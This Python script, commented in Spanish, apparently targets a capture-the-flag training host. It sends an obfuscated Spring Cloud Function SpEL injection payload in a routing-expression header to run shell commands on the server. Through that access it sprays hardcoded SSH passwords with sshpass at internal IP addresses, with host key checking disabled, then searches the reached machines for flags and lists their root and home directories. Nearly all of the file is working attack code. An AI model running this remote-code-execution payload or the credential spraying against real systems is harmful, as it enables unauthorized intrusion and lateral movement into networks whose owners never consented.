#!/usr/bin/env python3
"""
CTF Chile - Ataque SSH directo con credenciales vault
Intento inmediato en las IPs más prometedoras
"""
import requests

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

def execute_rce(cmd):
    payload = (
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("exe"+"c",new String[]{}.getClass())'
        '.invoke('
        'T(java.lang.Class).forName("java.lang.Runt"+"ime")'
        '.getMethod("getRunt"+"ime").invoke(null),'
        'new String[]{"/bin/sh","-c","' + cmd.replace('"', '\\"') + '"}'
        ').waitFor()'
    )
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        return r.text.strip()
    except:
        return "Error"

print("🚀 ATAQUE SSH DIRECTO")
print("=" * 30)

# IPs prioritarias y credenciales vault
ips = ["17.0.0.64", "16.0.0.64", "10.160.209.1"]
creds = [("vault", "admin123"), ("admin", "admin123"), ("root", "admin123")]

for ip in ips:
    print(f"\n🎯 Atacando {ip}")
    for user, password in creds:
        print(f"   Probando {user}:{password}...")

        # Comando SSH directo
        cmd = f"sshpass -p '{password}' ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no {user}@{ip} 'echo ACCESS_SUCCESS && whoami && hostname && find / -name \"*flag*\" 2>/dev/null | head -10'"
        result = execute_rce(cmd)

        if "ACCESS_SUCCESS" in result:
            print(f"   ✅ ÉXITO SSH {user}@{ip}!")
            print(f"   Resultado: {result}")

            # Si SSH funciona, buscar flags inmediatamente
            flag_cmd = f"sshpass -p '{password}' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no {user}@{ip} 'grep -r \"CTF{{\" / 2>/dev/null | head -5'"
            flag_result = execute_rce(flag_cmd)
            print(f"   🏆 Búsqueda flags: {flag_result}")

            # Buscar en directorios específicos
            dirs_cmd = f"sshpass -p '{password}' ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no {user}@{ip} 'ls -la /root /home 2>/dev/null'"
            dirs_result = execute_rce(dirs_cmd)
            print(f"   📁 Directorios: {dirs_result}")

        elif "refused" in result.lower():
            print(f"   ❌ Conexión rechazada")
        elif "timeout" in result.lower():
            print(f"   ⏰ Timeout")
        elif len(result) > 10:
            print(f"   ❓ Respuesta: {result[:100]}...")
        else:
            print(f"   ❌ Sin acceso")

print(f"\n🔍 Si no hubo éxito SSH, revisar webhook del script en background...")
print("="*50)